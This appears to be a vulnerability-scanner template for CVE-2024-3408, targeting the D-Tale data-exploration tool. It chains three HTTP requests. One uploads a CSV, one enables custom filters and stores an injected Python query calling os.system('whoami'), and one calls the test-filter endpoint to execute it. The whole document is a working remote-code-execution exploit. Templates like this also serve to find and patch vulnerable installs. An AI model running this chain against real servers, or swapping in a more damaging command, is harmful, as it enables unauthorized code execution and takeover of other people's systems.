id: cve-2024-3408

info:
  name: D-Tale Auth Bypass & RCE via Custom Filters
  author: Samuel
  severity: critical
  description: D-Tale custom filters RCE with forged session cookie
  tags: cve,cve2024,dtale,rce

variables:
  boundary: "{{rand_text_alpha(12)}}"
  payload: "@pd.core.frame.com.builtins.__import__('os').system('whoami')"
  settings_json: '{"enable_custom_filters":true,"query":"{{payload}}"}'

http:
  # ------------------------------------------------------------
  # 1) Upload CSV â†’ get data_id
  # ------------------------------------------------------------
  - method: POST
    path:
      - "{{BaseURL}}/dtale/upload"
    headers:
      Cookie: "session={{cookie}}"
      Content-Type: "multipart/form-data; boundary={{boundary}}"
    body: |
      --{{boundary}}
      Content-Disposition: form-data; name="poc.csv"; filename="poc.csv"
      Content-Type: text/csv

      col
      123
      --{{boundary}}--
    matchers:
      - type: word
        part: body
        words:
          - '"success":true'
    extractors:
      - type: regex
        name: data_id
        part: body
        regex:
          - '"data_id"\s*:\s*"?([0-9]+)"?'
        group: 1
        internal: true

  # ------------------------------------------------------------
  # 2) Enable filters + inject payload (VALID JSON)
  # ------------------------------------------------------------
  - method: GET
    path:
      - "{{BaseURL}}/dtale/update-settings/{{data_id}}?settings={{url_encode(settings_json)}}&save=true"
    headers:
      Cookie: "session={{cookie}}"
    matchers:
      - type: word
        part: body
        words:
          - '"success":true'

  # ------------------------------------------------------------
  # 3) Trigger execution
  # ------------------------------------------------------------
  - method: GET
    path:
      - "{{BaseURL}}/dtale/test-filter/{{data_id}}?query={{url_encode(payload)}}&save=true"
    headers:
      Cookie: "session={{cookie}}"
    matchers:
      - type: word
        part: body
        words:
          - '"success":true'
